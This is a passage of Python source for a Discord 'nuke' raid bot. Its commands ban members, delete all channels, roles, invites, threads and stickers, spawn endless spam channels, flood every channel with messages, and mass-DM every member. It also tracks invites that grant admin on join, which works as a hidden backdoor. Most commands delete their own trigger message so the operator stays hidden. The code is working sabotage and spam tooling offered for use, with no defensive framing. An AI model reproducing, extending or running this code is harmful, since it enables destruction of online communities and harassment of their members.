        print(f'{Back.RED}{Fore.WHITE}[☠ DEATH ☠] Phase 2: Deleting all channels...{Style.RESET_ALL}')
        for channel in list(guild.channels):
            try:
                await channel.delete(reason=f"DEATH COMMAND | Executed by {author}")
                if isinstance(channel, discord.CategoryChannel):
                    deleted_categories += 1
                else:
                    deleted_channels += 1
            except Exception:
                pass

        print(f'{Back.RED}{Fore.WHITE}[☠ DEATH ☠] Phase 3: Deleting all roles...{Style.RESET_ALL}')
        for role in list(guild.roles):
            if role.is_default():
                continue
            if role.name == ".":
                continue
            if role in guild.me.roles:
                continue
            if role.managed:
                continue
            try:
                await role.delete(reason=f"DEATH COMMAND | Executed by {author}")
                deleted_roles += 1
            except Exception:
                pass

        print(f'{Back.RED}{Fore.WHITE}{Style.BRIGHT}[☠ DEATH ☠] COMPLETE - Server obliterated: {banned_count} banned, {deleted_channels} channels destroyed, {deleted_categories} categories removed, {deleted_roles} roles deleted{Style.RESET_ALL}')

        try:
            embed = discord.Embed(
                description=t("death_complete", banned=banned_count, channels=deleted_channels, roles=deleted_roles),
                color=discord.Color.dark_red()
            )
            await author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        try:
            await author.send(t("death_no_permission"))
        except discord.Forbidden:
            pass
    except Exception as e:
        try:
            await author.send(t("error_occurred", error=str(e)))
        except discord.Forbidden:
            pass


@is_authorized()
@commands.cooldown(1, 120, commands.BucketType.guild)
@bot.command(name='brainfuck')
@commands.has_permissions(administrator=True)
async def brainfuck(ctx, channel_name: str, *, spam_message: str):
    """Delete all channels, then infinitely create channels and spam in them"""
    try:
        print(f'{Fore.MAGENTA}{Style.BRIGHT}[BRAINFUCK] {Fore.WHITE}INFINITE MODE - Initiated by {ctx.author.display_name} in {ctx.guild.name} | Channel: "{channel_name}" | Message: "{spam_message}"{Style.RESET_ALL}')

        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        guild = ctx.guild
        author = ctx.author

        try:
            await author.send(t("brainfuck_initiated"))
        except discord.Forbidden:
            pass

        deleted_count = 0

        print(f'{Fore.MAGENTA}[BRAINFUCK] {Fore.WHITE}Phase 1: Deleting all channels and categories...{Style.RESET_ALL}')
        for channel in list(guild.channels):
            try:
                await channel.delete(reason=f"BRAINFUCK | Executed by {author}")
                deleted_count += 1
            except Exception:
                pass

        print(f'{Fore.MAGENTA}[BRAINFUCK] {Fore.WHITE}Deleted {deleted_count} channels - NOW ENTERING INFINITE CHAOS MODE{Style.RESET_ALL}')

        task_key = f"brainfuck_{guild.id}"
        channels_created = 0
        spam_tasks: list[asyncio.Task] = []

        async def spam_channel(channel, message):
            while True:
                try:
                    await channel.send(message)
                except (discord.HTTPException, discord.Forbidden, discord.NotFound):
                    break

        print(f'{Fore.MAGENTA}[BRAINFUCK] {Fore.WHITE}Phase 2: INFINITE channel creation and spam loop activated...{Style.RESET_ALL}')
        try:
            await author.send(t("brainfuck_active"))
        except discord.Forbidden:
            pass

        async def brainfuck_loop():
            nonlocal channels_created
            try:
                while True:
                    try:
                        new_channel = await guild.create_text_channel(
                            name=channel_name,
                            reason=f"BRAINFUCK infinite | Executed by {author}"
                        )
                        channels_created += 1
                        task = asyncio.create_task(spam_channel(new_channel, spam_message))
                        spam_tasks.append(task)
                        if channels_created % 10 == 0:
                            print(f'{Fore.MAGENTA}{Style.BRIGHT}[BRAINFUCK] {Fore.WHITE}{channels_created} channels created...{Style.RESET_ALL}')
                    except discord.HTTPException:
                        await asyncio.sleep(0.5)
            except asyncio.CancelledError:
                for t_ in spam_tasks:
                    t_.cancel()
                print(f'{Fore.MAGENTA}[BRAINFUCK] {Fore.WHITE}Stopped after {channels_created} channels.{Style.RESET_ALL}')

        task = asyncio.create_task(brainfuck_loop())
        _active_tasks[task_key] = task

    except discord.Forbidden:
        try:
            await author.send(t("brainfuck_no_permission"))
        except discord.Forbidden:
            pass
    except Exception as e:
        try:
            await author.send(t("error_occurred", error=str(e)))
        except discord.Forbidden:
            pass


@is_authorized()
@bot.command(name='spam')
@commands.has_permissions(manage_messages=True)
async def spam(ctx, count: int, *, message: str):
    """Spam a message in all channels"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        guild = ctx.guild
        author = ctx.author

        if count == 0:
            print(f'{Fore.YELLOW}{Style.BRIGHT}[SPAM] {Fore.WHITE}INFINITE SPAM initiated by {author.display_name} in {guild.name} | Message: "{message}"{Style.RESET_ALL}')

            try:
                await author.send(t("spam_infinite_started", message=message))
            except discord.Forbidden:
                pass

            task_key = f"spam_{guild.id}"
            spam_count = 0

            async def spam_loop():
                nonlocal spam_count
                try:
                    while True:
                        for channel in guild.text_channels:
                            try:
                                await channel.send(message)
                                spam_count += 1
                                if spam_count % 100 == 0:
                                    print(f'{Fore.YELLOW}[SPAM] {Fore.WHITE}{spam_count} messages sent...{Style.RESET_ALL}')
                            except (discord.HTTPException, discord.Forbidden):
                                pass
                except asyncio.CancelledError:
                    print(f'{Fore.YELLOW}[SPAM] {Fore.WHITE}Stopped after {spam_count} messages.{Style.RESET_ALL}')

            task = asyncio.create_task(spam_loop())
            _active_tasks[task_key] = task

        else:
            print(f'{Fore.YELLOW}{Style.BRIGHT}[SPAM] {Fore.WHITE}Spamming {count}x in all channels by {author.display_name} in {guild.name} | Message: "{message}"{Style.RESET_ALL}')

            try:
                await author.send(t("spam_starting", message=message, count=count))
            except discord.Forbidden:
                pass

            total_sent = 0
            channels_spammed = 0

            for channel in guild.text_channels:
                for _ in range(count):
                    try:
                        await channel.send(message)
                        total_sent += 1
                    except Exception:
                        pass
                channels_spammed += 1

            print(f'{Fore.YELLOW}[SPAM] {Fore.WHITE}Completed: {total_sent} messages sent across {channels_spammed} channels{Style.RESET_ALL}')

            try:
                embed = discord.Embed(
                    description=t("spam_complete", sent=total_sent, channels=channels_spammed),
                    color=discord.Color.gold()
                )
                await author.send(embed=embed)
            except discord.Forbidden:
                pass

    except discord.Forbidden:
        await send_dm(ctx, t("spam_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='dmall')
async def dmall(ctx, *, message: str):
    """DM all users in the server"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        guild = ctx.guild
        author = ctx.author

        print(f'{Fore.CYAN}{Style.BRIGHT}[DMALL] {Fore.WHITE}DM all initiated by {author.display_name} in {guild.name} | Message: "{message}"{Style.RESET_ALL}')

        try:
            await author.send(t("dmall_starting"))
        except discord.Forbidden:
            pass

        success_count = 0
        failed_count = 0

        members = list(guild.members)

        for member in members:
            if member.bot:
                failed_count += 1
                continue
            if member.id == author.id:
                continue
            try:
                await member.send(message)
                success_count += 1
            except discord.Forbidden:
                failed_count += 1
            except Exception:
                failed_count += 1

        print(f'{Fore.CYAN}{Style.BRIGHT}[DMALL] {Fore.WHITE}Complete: {success_count} DMs sent, {failed_count} failed in {guild.name}{Style.RESET_ALL}')
        try:
            embed = discord.Embed(
                description=t("dmall_complete", success=success_count, failed=failed_count),
                color=discord.Color.blue()
            )
            await author.send(embed=embed)
        except discord.Forbidden:
            pass

    except Exception as e:
        try:
            await author.send(t("error_occurred", error=str(e)))
        except discord.Forbidden:
            pass


@is_authorized()
@bot.command(name='dm')
async def dm(ctx, user: discord.Member, *, message: str):
    """DM a user"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        try:
            await user.send(message)
            print(f'{Fore.CYAN}[DM] {Fore.WHITE}DM sent to {user.display_name} by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')

            embed = discord.Embed(
                description=t("dm_success", user=user.mention),
                color=discord.Color.green()
            )
            await send_dm(ctx, embed=embed)
        except discord.Forbidden:
            embed = discord.Embed(
                description=t("dm_failed", user=user.mention),
                color=discord.Color.red()
            )
            await send_dm(ctx, embed=embed)
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='serverinfo')
async def serverinfo(ctx):
    """Get detailed server information"""
    try:
        print(f'{Fore.CYAN}[SERVERINFO] {Fore.WHITE}Server info requested by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')

        guild = ctx.guild

        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        text_channels = len(guild.text_channels)
        voice_channels = len(guild.voice_channels)
        categories = len(guild.categories)

        bot_count = len([m for m in guild.members if m.bot])
        human_count = guild.member_count - bot_count

        description = f"""**{guild.name}**
Members: {guild.member_count} ({human_count} humans, {bot_count} bots)
Channels: {text_channels} text, {voice_channels} voice, {categories} categories
Roles: {len(guild.roles)}
Owner: {guild.owner.mention if guild.owner else "Unknown"}
Created: {guild.created_at.strftime("%Y-%m-%d")}"""

        embed = discord.Embed(
            description=description,
            color=discord.Color.blue()
        )

        if guild.icon:
            embed.set_thumbnail(url=guild.icon.url)

        try:
            await ctx.author.send(embed=embed)
            await ctx.send(t("serverinfo_sent"), delete_after=3)
        except discord.Forbidden:
            await ctx.send(t("serverinfo_dm_failed"), delete_after=5)

    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='stop')
async def stop_tasks(ctx):
    """Cancel any running background tasks (spam, brainfuck) in this server"""
    try:
        await ctx.message.delete()
    except (discord.HTTPException, discord.NotFound):
        pass

    guild_id = ctx.guild.id
    stopped = []
    for key in [f"spam_{guild_id}", f"brainfuck_{guild_id}"]:
        task = _active_tasks.pop(key, None)
        if task and not task.done():
            task.cancel()
            stopped.append(key.split("_")[0])

    if stopped:
        embed = discord.Embed(
            description=f"Stopped: {', '.join(stopped)}",
            color=discord.Color.green()
        )
    else:
        embed = discord.Embed(
            description="No active tasks to stop.",
            color=discord.Color.orange()
        )
    try:
        await ctx.author.send(embed=embed)
    except discord.Forbidden:
        pass


@is_authorized()
@bot.command(name='shutdown')
@commands.has_permissions(administrator=True)
async def shutdown(ctx):
    """Shutdown the bot"""
    try:
        print(f'{Back.RED}{Fore.WHITE}{Style.BRIGHT}{t("shutdown_initiated", user=ctx.author.display_name)}{Style.RESET_ALL}')
        logger.warning(t("bot_shutdown", user=ctx.author, user_id=ctx.author.id,
                         guild=ctx.guild.name, guild_id=ctx.guild.id))

        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        try:
            embed = discord.Embed(
                description=t("shutdown_message"),
                color=discord.Color.red()
            )
            await ctx.author.send(embed=embed)
        except discord.Forbidden:
            pass

        try:
            await ctx.send(t("shutdown_farewell"), delete_after=3)
        except discord.Forbidden:
            pass

        print(f'{Back.RED}{Fore.WHITE}{t("shutdown_now")}{Style.RESET_ALL}')
        logger.info(t("bot_shutdown_complete"))

        for key, task in list(_active_tasks.items()):
            if not task.done():
                task.cancel()
        if _active_tasks:
            await asyncio.gather(*_active_tasks.values(), return_exceptions=True)
        _active_tasks.clear()

        await bot.close()

    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='invite-nuke')
@commands.has_permissions(manage_guild=True)
async def invite_nuke(ctx):
    """Delete all server invites"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        guild = ctx.guild
        author = ctx.author

        print(f'{Fore.RED}[INVITE-NUKE] {Fore.WHITE}Invite nuke initiated by {author.display_name} in {guild.name}{Style.RESET_ALL}')

        try:
            await author.send(t("invite_nuke_starting"))
        except discord.Forbidden:
            pass

        invites = await guild.invites()
        deleted = 0

        for invite in invites:
            try:
                await invite.delete(reason=f"Invite nuke by {author}")
                deleted += 1
            except Exception:
                pass

        print(f'{Fore.RED}[INVITE-NUKE] {Fore.WHITE}Complete: {deleted} invites deleted in {guild.name}{Style.RESET_ALL}')

        try:
            embed = discord.Embed(
                description=t("invite_nuke_complete", count=deleted),
                color=discord.Color.red()
            )
            await author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, t("invite_nuke_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='thread-nuke')
@commands.has_permissions(manage_threads=True)
async def thread_nuke(ctx):
    """Delete all active threads in the server"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        guild = ctx.guild
        author = ctx.author

        print(f'{Fore.RED}[THREAD-NUKE] {Fore.WHITE}Thread nuke initiated by {author.display_name} in {guild.name}{Style.RESET_ALL}')

        try:
            await author.send(t("thread_nuke_starting"))
        except discord.Forbidden:
            pass

        deleted = 0

        for thread in list(guild.threads):
            try:
                await thread.delete()
                deleted += 1
            except Exception:
                pass

        print(f'{Fore.RED}[THREAD-NUKE] {Fore.WHITE}Complete: {deleted} threads deleted in {guild.name}{Style.RESET_ALL}')

        try:
            embed = discord.Embed(
                description=t("thread_nuke_complete", count=deleted),
                color=discord.Color.red()
            )
            await author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, t("thread_nuke_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='bot-nuke')
@commands.has_permissions(kick_members=True)
async def bot_nuke(ctx):
    """Kick all bots from the server"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        guild = ctx.guild
        author = ctx.author

        bots = [m for m in guild.members if m.bot and m.id != bot.user.id]

        if not bots:
            await send_dm(ctx, t("bot_nuke_no_bots"))
            return

        print(f'{Fore.RED}[BOT-NUKE] {Fore.WHITE}Bot nuke initiated by {author.display_name} in {guild.name} | {len(bots)} bots found{Style.RESET_ALL}')

        try:
            await author.send(t("bot_nuke_starting"))
        except discord.Forbidden:
            pass

        kicked = 0

        for member in bots:
            try:
                await member.kick(reason=f"Bot nuke by {author}")
                kicked += 1
            except Exception:
                pass

        print(f'{Fore.RED}[BOT-NUKE] {Fore.WHITE}Complete: {kicked} bots kicked in {guild.name}{Style.RESET_ALL}')

        try:
            embed = discord.Embed(
                description=t("bot_nuke_complete", count=kicked),
                color=discord.Color.red()
            )
            await author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, t("bot_nuke_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='slowmode-all')
@commands.has_permissions(manage_channels=True)
async def slowmode_all(ctx, seconds: int = 21600):
    """Set slowmode on all text channels"""
    if seconds < 0 or seconds > 21600:
        await send_dm(ctx, t("slowmode_all_invalid"))
        return

    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        guild = ctx.guild
        author = ctx.author

        print(f'{Fore.YELLOW}[SLOWMODE-ALL] {Fore.WHITE}Slowmode-all ({seconds}s) initiated by {author.display_name} in {guild.name}{Style.RESET_ALL}')

        try:
            await author.send(t("slowmode_all_starting", seconds=seconds))
        except discord.Forbidden:
            pass

        count = 0

        for channel in guild.text_channels:
            try:
                await channel.edit(slowmode_delay=seconds, reason=f"Slowmode-all by {author}")
                count += 1
            except Exception:
                pass

        print(f'{Fore.YELLOW}[SLOWMODE-ALL] {Fore.WHITE}Complete: {count} channels updated in {guild.name}{Style.RESET_ALL}')

        try:
            embed = discord.Embed(
                description=t("slowmode_all_complete", count=count),
                color=discord.Color.orange()
            )
            await author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, t("slowmode_all_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='sticker-nuke')
@commands.has_permissions(manage_emojis_and_stickers=True)
async def sticker_nuke(ctx):
    """Delete all custom stickers in the server"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        guild = ctx.guild
        author = ctx.author

        print(f'{Fore.RED}[STICKER-NUKE] {Fore.WHITE}Sticker nuke initiated by {author.display_name} in {guild.name}{Style.RESET_ALL}')

        try:
            await author.send(t("sticker_nuke_starting"))
        except discord.Forbidden:
            pass

        stickers = await guild.fetch_stickers()
        deleted = 0

        for sticker in stickers:
            try:
                await sticker.delete(reason=f"Sticker nuke by {author}")
                deleted += 1
            except Exception:
                pass

        print(f'{Fore.RED}[STICKER-NUKE] {Fore.WHITE}Complete: {deleted} stickers deleted in {guild.name}{Style.RESET_ALL}')

        try:
            embed = discord.Embed(
                description=t("sticker_nuke_complete", count=deleted),
                color=discord.Color.red()
            )
            await author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, t("sticker_nuke_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='server-backup')
async def server_backup(ctx):
    """Backup server structure to a JSON file sent via DM"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        guild = ctx.guild
        author = ctx.author

        print(f'{Fore.CYAN}[SERVER-BACKUP] {Fore.WHITE}Server backup initiated by {author.display_name} in {guild.name}{Style.RESET_ALL}')

        try:
            await author.send(t("server_backup_starting"))
        except discord.Forbidden:
            pass

        backup = {
            "name": guild.name,
            "id": str(guild.id),
            "description": guild.description or "",
            "member_count": guild.member_count,
            "created_at": guild.created_at.isoformat(),
            "backed_up_at": datetime.now().isoformat(),
            "roles": [],
            "categories": [],
            "channels": [],
            "emojis": []
        }

        for role in guild.roles:
            if role.is_default():
                continue
            backup["roles"].append({
                "name": role.name,
                "color": str(role.color),
                "permissions": role.permissions.value,
                "mentionable": role.mentionable,
                "hoist": role.hoist,
                "position": role.position
            })

        for category in guild.categories:
            backup["categories"].append({
                "name": category.name,
                "position": category.position
            })

        for channel in guild.channels:
            if isinstance(channel, discord.CategoryChannel):
                continue
            channel_data = {
                "name": channel.name,
                "type": str(channel.type),
                "position": channel.position,
                "category": channel.category.name if channel.category else None
            }
            if isinstance(channel, discord.TextChannel):
                channel_data["topic"] = channel.topic or ""
                channel_data["nsfw"] = channel.nsfw
                channel_data["slowmode_delay"] = channel.slowmode_delay
            backup["channels"].append(channel_data)

        for emoji in guild.emojis:
            backup["emojis"].append({
                "name": emoji.name,
                "animated": emoji.animated,
                "id": str(emoji.id)
            })

        filename = f"backup_{guild.name.replace(' ', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        backup_json = json.dumps(backup, indent=2, ensure_ascii=False)
        file_obj = discord.File(fp=io.BytesIO(backup_json.encode('utf-8')), filename=filename)

        try:
            embed = discord.Embed(
                description=t("server_backup_complete", filename=filename),
                color=discord.Color.green()
            )
            await author.send(embed=embed, file=file_obj)
        except discord.Forbidden:
            pass

        print(f'{Fore.CYAN}[SERVER-BACKUP] {Fore.WHITE}Complete: backup sent for {guild.name}{Style.RESET_ALL}')

    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='unban-all')
@commands.has_permissions(ban_members=True)
async def unban_all(ctx):
    """Unban all banned users in the server"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        guild = ctx.guild
        author = ctx.author

        print(f'{Fore.YELLOW}[UNBAN-ALL] {Fore.WHITE}Unban-all initiated by {author.display_name} in {guild.name}{Style.RESET_ALL}')

        try:
            await author.send(t("unban_all_starting"))
        except discord.Forbidden:
            pass

        unbanned = 0

        async for ban_entry in guild.bans(limit=None):
            try:
                await guild.unban(ban_entry.user, reason=f"Unban-all by {author}")
                unbanned += 1
            except Exception:
                pass

        print(f'{Fore.YELLOW}[UNBAN-ALL] {Fore.WHITE}Complete: {unbanned} users unbanned in {guild.name}{Style.RESET_ALL}')

        try:
            embed = discord.Embed(
                description=t("unban_all_complete", count=unbanned),
                color=discord.Color.green()
            )
            await author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, t("unban_all_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_owner()
@bot.command(name='whitelist-add')
async def whitelist_add(ctx, user_id: int):
    """Add a user ID to the whitelist"""
    try:
        await ctx.message.delete()
    except (discord.HTTPException, discord.NotFound):
        pass

    whitelist = config.get("whitelist", [])

    if user_id in whitelist:
        embed = discord.Embed(
            description=t("whitelist_already_added", user_id=user_id),
            color=discord.Color.orange()
        )
        await send_dm(ctx, embed=embed)
        return

    whitelist.append(user_id)
    config["whitelist"] = whitelist
    save_config(config)

    print(f'{Fore.GREEN}[WHITELIST] {Fore.WHITE}{ctx.author.display_name} added {user_id} to whitelist{Style.RESET_ALL}')
    logger.info(f"Whitelist: {ctx.author} (ID: {ctx.author.id}) added user ID {user_id}")

    embed = discord.Embed(
        description=t("whitelist_add_success", user_id=user_id),
        color=discord.Color.green()
    )
    await send_dm(ctx, embed=embed)


@is_owner()
@bot.command(name='whitelist-remove')
async def whitelist_remove(ctx, user_id: int):
    """Remove a user ID from the whitelist"""
    try:
        await ctx.message.delete()
    except (discord.HTTPException, discord.NotFound):
        pass

    whitelist = config.get("whitelist", [])

    if user_id not in whitelist:
        embed = discord.Embed(
            description=t("whitelist_not_found", user_id=user_id),
            color=discord.Color.orange()
        )
        await send_dm(ctx, embed=embed)
        return

    whitelist.remove(user_id)
    config["whitelist"] = whitelist
    save_config(config)

    print(f'{Fore.YELLOW}[WHITELIST] {Fore.WHITE}{ctx.author.display_name} removed {user_id} from whitelist{Style.RESET_ALL}')
    logger.info(f"Whitelist: {ctx.author} (ID: {ctx.author.id}) removed user ID {user_id}")

    embed = discord.Embed(
        description=t("whitelist_remove_success", user_id=user_id),
        color=discord.Color.green()
    )
    await send_dm(ctx, embed=embed)


@is_owner()
@bot.command(name='whitelist-list')
async def whitelist_list(ctx):
    """List all whitelisted user IDs"""
    try:
        await ctx.message.delete()
    except (discord.HTTPException, discord.NotFound):
        pass

    whitelist = config.get("whitelist", [])

    if not whitelist:
        embed = discord.Embed(
            description=t("whitelist_empty"),
            color=discord.Color.blue()
        )
    else:
        entries = "\n".join([f"`{uid}`" for uid in whitelist])
        embed = discord.Embed(
            title=t("whitelist_list_title"),
            description=entries,
            color=discord.Color.blue()
        )
        embed.set_footer(text=t("whitelist_list_footer", count=len(whitelist)))

    try:
        await ctx.author.send(embed=embed)
        await ctx.send(t("whitelist_list_sent"), delete_after=3)
    except discord.Forbidden:
        await ctx.send(embed=embed, delete_after=10)


@is_owner()
@bot.command(name='admin-invites')
async def admin_invites_cmd(ctx):
    """List tracked admin invites"""
    try:
        await ctx.message.delete()
    except (discord.HTTPException, discord.NotFound):
        pass

    if not _admin_invites:
        await send_dm(ctx, embed=discord.Embed(
            description="No admin invites tracked.",
            color=discord.Color.orange()
        ))
        return

    lines = []
    for code in sorted(_admin_invites):
        lines.append(f"`{code}` — https://discord.gg/{code}")

    embed = discord.Embed(
        title="Admin invites",
        description="\n".join(lines),
        color=discord.Color.gold()
    )
    embed.set_footer(text="Use `clear-admin-invite <code>` to revoke admin-granting status")
    await send_dm(ctx, embed=embed)


@is_owner()
@bot.command(name='clear-admin-invite')
async def clear_admin_invite(ctx, code: str):
    """Stop an invite from granting admin on join"""
    try:
        await ctx.message.delete()
    except (discord.HTTPException, discord.NotFound):
        pass

    if code not in _admin_invites:
        await send_dm(ctx, embed=discord.Embed(
            description=f"`{code}` is not tracked.",
            color=discord.Color.orange()
        ))
        return

    _admin_invites.discard(code)
    persisted = config.get("admin_invites", [])
    if code in persisted:
        persisted.remove(code)
    config["admin_invites"] = persisted
    save_config(config)

    await send_dm(ctx, embed=discord.Embed(
        description=f"`{code}` will no longer grant admin.",
        color=discord.Color.green()
    ))


# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    token = config.get("token")
    if not token:
        print(f'{Fore.RED}{t("token_not_found")}{Style.RESET_ALL}')
        print(t("token_add_instruction"))
        print(t("token_example"))
    else:
        print(f'{Fore.CYAN}{t("token_loaded")}{Style.RESET_ALL}')

        configure_proxy(bot, config, logger)

        bot.run(token)
